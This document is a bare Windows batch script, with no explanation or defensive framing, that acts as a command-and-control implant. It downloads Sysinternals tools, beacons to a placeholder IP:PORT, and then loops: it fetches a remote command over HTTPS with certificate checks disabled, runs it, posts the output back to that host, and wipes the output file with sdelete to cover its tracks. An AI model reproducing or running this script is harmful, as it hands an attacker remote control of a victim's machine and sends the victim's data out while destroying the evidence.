@echo off

SET /A INDEX=1
SET /A COUNT=5
SET preq="0"

IF NOT EXIST %TEMP%\psping64.exe (
	curl https://live.sysinternals.com/psping64.exe --output %TEMP%\psping64.exe
)

IF NOT EXIST %TEMP%\sdelete64.exe (
	curl https://live.sysinternals.com/sdelete64.exe --output %TEMP%\sdelete64.exe
)

if NOT EXIST %TEMP%\accesschk.exe (
	curl https://live.sysinternals.com/accesschk.exe  --output %TEMP%\accesschk.exe
)

:BEACON
IF %INDEX% LEQ %COUNT% (
	%TEMP%\psping64.exe /accepteula -n 1 -i 0 IP:PORT | findstr /C:"Received = 1" > NUL && (GOTO:WHILE)
	timeout /t 2 /nobreak > NUL
	timeout /t 120 /nobreak > NUL
	SET /A "INDEX=%INDEX%+1"
	GOTO:BEACON 
) ELSE (
	taskkill /F /IM cmd.exe
)



:WHILE
FOR /F "delims=" %%i IN ('curl -k -X GET https://IP:PORT -tlsv1') DO set command=%%i
CALL %command% > %TEMP%\out
curl -X POST --data-binary @%TEMP%\out https://IP:PORT -k -tlsv1
echo > %TEMP%\out
%TEMP%\sdelete64.exe -p 2 /accepteula %TEMP%\out
timeout /t 5 /nobreak >NUL
GOTO:WHILE

%TEMP%\sdelete64.exe -p 5 /accepteula %TEMP%\out
taskkill /F /IM cmd.exe

